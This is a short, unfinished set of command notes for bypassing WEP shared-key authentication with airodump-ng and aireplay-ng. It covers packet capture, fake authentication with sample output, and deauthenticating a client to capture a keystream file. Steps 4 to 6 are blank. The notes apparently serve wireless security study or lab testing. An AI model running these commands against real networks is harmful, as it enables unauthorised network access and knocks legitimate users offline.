





###############################################
# Wep: bypass wep ska w/ client (sharedkey)   #
# - shared key                                #
# https://www.aircrack-ng.org/doku.php?id=shared_key #
###############################################
# STEP 1:
airodump-ng -c 8 --bssid 4C:60:DE:4A:62:80 -w sharedkey mon0
# STEP 2: fake auth to confirm sharedkey as open auth is not supported
aireplay-ng -1 0 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
    # root@bt:~# aireplay-ng -1 0 -e hostileNetwork2g -a 4C:60:DE:4A:62:80 -h 00:C0:CA:53:0A:D1 mon0
    # 15:43:15  Waiting for beacon frame (BSSID: 4C:60:DE:4A:62:80) on channel 8
    # 15:43:15  Sending Authentication Request (Open System) [ACK]
    # 15:43:15  Switching to shared key authentication
# STEP 3: dauth a connected client to disaply SKA in airodump and capture prga file as *.xor
aireplay-ng -0 1 -a 4C:60:DE:4A:62:80  -c 48:51:B7:DB:90:DE mon0
# STEP 4: 
# STEP 5:
# STEP 6: